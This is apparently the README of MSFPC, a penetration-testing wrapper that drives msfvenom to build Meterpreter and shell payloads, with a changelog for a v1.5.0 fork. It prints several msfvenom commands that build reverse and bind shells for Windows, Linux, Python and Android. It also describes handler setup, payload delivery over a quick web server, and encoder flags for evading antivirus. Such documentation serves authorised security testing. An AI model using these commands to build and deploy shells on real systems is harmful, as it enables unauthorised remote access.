## MSFvenom Payload Creator (MSFPC)

A **quick** way to generate various "basic" Meterpreter payloads via `msfvenom` (part of the Metasploit framework).

<p align="center">
  <img src="http://i.imgur.com/rOqMdwp.png" alt="msfpc logo"/>
</p>


- - -


## About

MSFvenom Payload Creator (MSFPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as **simple as possible** (**only requiring one input**) to produce their payload.

**Fully automating** msfvenom & Metasploit is the end goal _(well as to be be able to automate MSFPC itself)_.
The rest is to make the user's life as **easy as possible** (e.g. **IP selection menu**, **msfconsole resource file/commands**, **batch payload production** and able to enter **any argument in any order** _(in various formats/patterns)_).

The only necessary input from the user should be **defining the payload** they want by either the **platform** (e.g. `windows`), or the **file extension** they wish the payload to have (e.g. `exe`).

* **Can't remember your IP for a interface? Don't sweat it, just use the interface name**: `eth0`.
* **Don't know what your external IP is? MSFPC will discover it**: `wan`.
* **Want to generate one of each payload? No issue!** Try: `loop`.
* **Want to mass create payloads? Everything? Or to filter your select? ..Either way, its not a problem**. Try: `batch` (for everything), `batch msf` (for every Meterpreter option), `batch staged` (for every staged payload), or `batch cmd stageless` (for every stageless command prompt)!

_Note: This will **NOT** try to bypass any anti-virus solutions at any stage._

![Msfvenom Payload Creator (MSFPC)](https://i.imgur.com/tN9q5iG.png)


- - -


## Install

+ Designed for **Kali Linux v2.x/Rolling** & **Metasploit v4.11+**.
+ Kali v1.x should work.
+ OSX 10.11+ should work.
+ Weakerth4n 6+ should work.
+ _...nothing else has been tested._

```
$ curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/msfpc.sh" > /usr/local/bin/msfpc
$ chmod 0755 /usr/local/bin/msfpc
```

### Kali-Linux

MSFPC is already [packaged](https://pkg.kali.org/pkg/msfpc) in [Kali Rolling](https://www.kali.org/), so all you have to-do is:

```bash
root@kali:~# apt install -y msfpc
```



- - -


## Help

```
$ bash msfpc.sh -h -v
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)

 msfpc.sh <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
   Example: msfpc.sh windows 192.168.1.10        # Windows & manual IP.
            msfpc.sh elf bind eth0 4444          # Linux, eth0's IP & manual port.
            msfpc.sh stageless cmd py https      # Python, stageless command prompt.
            msfpc.sh verbose loop eth1           # A payload for every type, using eth1's IP.
            msfpc.sh msf batch wan               # All possible Meterpreter payloads, using WAN IP.
            msfpc.sh help verbose                # Help screen, with even more information.

 <TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .dll]

 Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.
 Missing <DOMAIN/IP> will default to the IP menu.

 Missing <PORT> will default to 443.

 <CMD> is a standard/native command prompt/terminal to interactive with.
 <MSF> is a custom cross platform shell, gaining the full power of Metasploit.
 Missing <CMD/MSF> will default to <MSF> where possible.
   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format.
 <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limit Metasploit post modules/scripts support.
 <MSF> payloads are generally much larger than <CMD>, as it comes with more features.

 <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
 <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
 Missing <BIND/REVERSE> will default to <REVERSE>.
 <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs to the target to be repeatedly connecting back to permanent maintain access.

 <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.
 <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.
 Missing <STAGED/STAGELESS> will default to <STAGED> where possible.
   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format.
 <STAGED> are 'better' in low-bandwidth/high-latency environments.
 <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS.
 More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
                   https://www.offensive-security.com/metasploit-unleashed/payload-types/
                   https://www.offensive-security.com/metasploit-unleashed/payloads/

 <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
 <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
 <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
 <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.
 Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.
 By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size.
 More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication

 <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGLESS> & <TCP + HTTP + HTTPS + FIND_PORT>
 <LOOP> will just create one of each <TYPE>.

 <VERBOSE> will display more information.
$
```


## Example \#1 (Windows, Fully Automated Using Manual IP)

```bash
$ bash msfpc.sh windows 192.168.1.10
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i]   IP: 192.168.1.10
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \
  --platform windows -a x86 -e generic/none LHOST=192.168.1.10 LPORT=443 \
  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
$
```


## Example \#2 (Linux Format, Fully Automated Using Manual Interface and Port)

```bash
$ ./msfpc.sh elf bind eth0 4444 verbose
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i]        IP: 192.168.103.142
 [i]      PORT: 4444
 [i]      TYPE: linux (linux/x86/shell/bind_tcp)
 [i]     SHELL: shell
 [i] DIRECTION: bind
 [i]     STAGE: staged
 [i]    METHOD: tcp
 [i]       CMD: msfvenom -p linux/x86/shell/bind_tcp -f elf \
  --platform linux -a x86 -e generic/none  LPORT=4444 \
  > '/root/linux-shell-staged-bind-tcp-4444.elf'

 [i] linux shell created: '/root/linux-shell-staged-bind-tcp-4444.elf'

 [i] File: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, corrupted section header size
 [i] Size: 4.0K
 [i]  MD5: eed4623b765eea623f2e0206b63aad61
 [i] SHA1: 0b5dabd945ef81ec9283768054b3c22125aa9185

 [i] MSF handler file: '/root/linux-shell-staged-bind-tcp-4444-elf.rc'
 [i] Run: msfconsole -q -r '/root/linux-shell-staged-bind-tcp-4444-elf.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
$
```


## Example \#3 (Python Format, Interactive IP Menu)

```bash
$ msfpc stageless cmd py tcp
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)

 [i] Use which interface - IP address?:
 [i]   1.) eth0 - 192.168.103.142
 [i]   2.) lo - 127.0.0.1
 [i]   3.) wan - 31.204.154.174
 [?] Select 1-3, interface or IP address: 1

 [i]   IP: 192.168.103.142
 [i] PORT: 443
 [i] TYPE: python (python/shell_reverse_tcp)
 [i]  CMD: msfvenom -p python/shell_reverse_tcp -f raw \
  --platform python -e generic/none -a python LHOST=192.168.103.142 LPORT=443 \
  > '/root/python-shell-stageless-reverse-tcp-443.py'

 [i] python shell created: '/root/python-shell-stageless-reverse-tcp-443.py'

 [i] MSF handler file: '/root/python-shell-stageless-reverse-tcp-443-py.rc'
 [i] Run: msfconsole -q -r '/root/python-shell-stageless-reverse-tcp-443-py.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!
$
```

_Note: Removed WAN IP._


## Example \#4 (Loop - Generates one of everything)

```bash
$ ./msfpc.sh loop wan
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i] Loop Mode. Creating one of each TYPE, with default values

 [*] MSFvenom Payload Creator (MSFPC v1.4.4)
 [i]   IP: xxx.xxx.xxx.xxx
 [i] PORT: 443
 [i] TYPE: android (android/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=xxx.xxx.xxx.xxx LPORT=443 \
  > '/root/android-meterpreter-stageless-reverse-tcp-443.apk'

 [i] android meterpreter created: '/root/android-meterpreter-stageless-reverse-tcp-443.apk'

 [i] MSF handler file: '/root/android-meterpreter-stageless-reverse-tcp-443-apk.rc'
 [i] Run: msfconsole -q -r '/root/android-meterpreter-stageless-reverse-tcp-443-apk.rc'
 [?] Quick web server (for file transfer)?: python2 -m SimpleHTTPServer 8080
 [*] Done!


 [*] MSFvenom Payload Creator (MSFPC v1.4.4)

...SNIP...

 [*] Done!

$
```

_Note: Removed WAN IP._


![Examples](https://i.imgur.com/8zPx6p3.png)


- - -


## To-Do List

* ~~Shellcode generation~~ _(done in v1.5.0 — `raw`/`bin` type)_
* ~~x64 payloads~~ _(done in v1.4.5)_
* ~~IPv6 support~~ _(done in v1.5.0)_
* Look into using OS scripting more _(`powershell_bind_tcp` & `bind_perl` etc)_


- - -


## v1.5.0 — Exegol Fork Changelog

Major rewrite focused on bug fixes, security hardening, and new features.

### Bug Fixes

| # | Severity | Description |
|---|----------|-------------|
| 1 | **Critical** | IP menu always overrode selection with WAN IP (`"${INPUT}" == "${INPUT}"` was always true) |
| 2 | **Critical** | Duplicate short flags (`-p` for both `--platform` and `--port`, `-t` for both `--type` and `--tcp`) — second definition was unreachable |
| 3 | **Critical** | `--shell` flag conflict — `--shell` appeared in both `--cmd` group and standalone, making `--shell <value>` impossible |
| 4 | **Critical** | `--all` flag conflict — matched `find_port` before `batch`, making `--all` for batch mode unreachable |
| 5 | **High** | Tomcat `find_port` check compared against `"find_ports"` (with trailing `s`) — never matched |
| 6 | **High** | `exe-service` type was unreachable — not included in the Windows `elif` check |
| 7 | **Medium** | Error message for invalid `--flag` printed wrong variable (`${x}` from positional loop instead of current flag) |
| 8 | **Medium** | `PADDING` variable set in `doAction` leaked across calls in batch mode |
| 9 | **Medium** | Port regex accepted negative numbers (`^-?[0-9]+$`) |
| 10 | **Low** | `VERBOSE` checked before argument parsing (always false at WAN fetch) |

### Security Fixes

| # | Issue | Fix |
|---|-------|-----|
| 1 | `eval "${CMD}"` with user-supplied IP/PORT — **command injection** | Replaced with direct array execution: `msfvenom "${MSFVENOM_ARGS[@]}"` |
| 2 | Fixed `/tmp/msfpc.out` temp file — **symlink race (TOCTOU)** | Now uses `mktemp /tmp/msfpc.XXXXXX` |
| 3 | `eval ${CMD} "${url}"` for WAN IP fetch | Replaced with array execution: `"${_FETCHCMD[@]}" "${url}"` |
| 4 | Batch/loop used `eval "${0}"` for recursive calls | Replaced with `generatePayload` function — no subprocess/eval |
| 5 | Install comment used `curl -k` (disables TLS verification) | Removed `-k` flag; WAN fetch URLs upgraded to HTTPS |

### Refactoring

- **Single `VERSION` variable** — no more version string repeated in 3 places
- **Unified argument parser** — one `while/case` loop handles both `--flags` and positional keywords (was two separate loops with conflicts)
- **`generatePayload()` function** — all payload type logic in one callable function; batch/loop call it directly instead of recursive `eval "${0}"`
- **`doAction()` uses local variables** — no more global state leaks between calls
- **NIC arrays reused** — IP menu uses existing `IFACE`/`IPs` arrays instead of re-scanning with `ifconfig`

### New Features

#### New Payload Types

| Type | Extension | Description |
|------|-----------|-------------|
| `csharp` / `cs` | `.cs` | C# byte array (msfvenom `-f csharp`) |
| `hta` | `.hta` | HTA file with PowerShell execution (msfvenom `-f hta-psh`) |
| `vbscript` / `vbs` | `.vbs` | VBScript payload (msfvenom `-f vbs`) |
| `raw` / `bin` | `.bin` | Raw shellcode (msfvenom `-f raw`) |

#### New Flags

| Flag | Description |
|------|-------------|
| `--encoder <name>` | Encoder to use (e.g. `x86/shikata_ga_nai`). Default: `generic/none` |
| `--iterations <n>` | Number of encoding iterations |
| `--output <path>` | Output directory for generated files |
| `--format <fmt>` | Override output format (`raw`, `c`, `hex`, `csharp`, `base64`, etc.) |
| `--dry-run` | Print msfvenom commands without executing them |
| `--listen` | Auto-start `msfconsole` handler after payload generation |

#### Architecture Support

| Flag | Description |
|------|-------------|
| `--aarch64` / `arm64` | ARM 64-bit payloads (Linux) |
| `x64` / `--x64` | 64-bit payloads _(already in v1.4.5)_ |

#### Other

- **IPv6 support** — IPv6 addresses detected in arguments, accepted in IP menu
- **Config file (`~/.msfpcrc`)** — set persistent defaults for port, arch, encoder, method, direction, etc.
- **Handler-only + dry-run skip msfvenom check** — no need for Metasploit to be installed to preview commands

### Example — Dry Run with Encoder

```bash
$ msfpc --dry-run --encoder x86/shikata_ga_nai --iterations 3 windows x64 10.10.14.5
 [*] MSFvenom Payload Creator (MSFPC v1.5.0)
 [i]   IP: 10.10.14.5
 [i] PORT: 443
 [i] TYPE: windows (windows/x64/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe --platform windows -a x64 -e x86/shikata_ga_nai -i 3 LHOST=10.10.14.5 LPORT=443 > '.../windows-x64-meterpreter-staged-reverse-tcp-443.exe'

 [i] Dry-run mode — command printed above, nothing executed
```

### Example — Config File (`~/.msfpcrc`)

```ini
# Default port
port=4444
# Default architecture
arch=x64
# Default encoder
encoder=x86/shikata_ga_nai
# Encoding iterations
iterations=3
# Always verbose
verbose=true
```
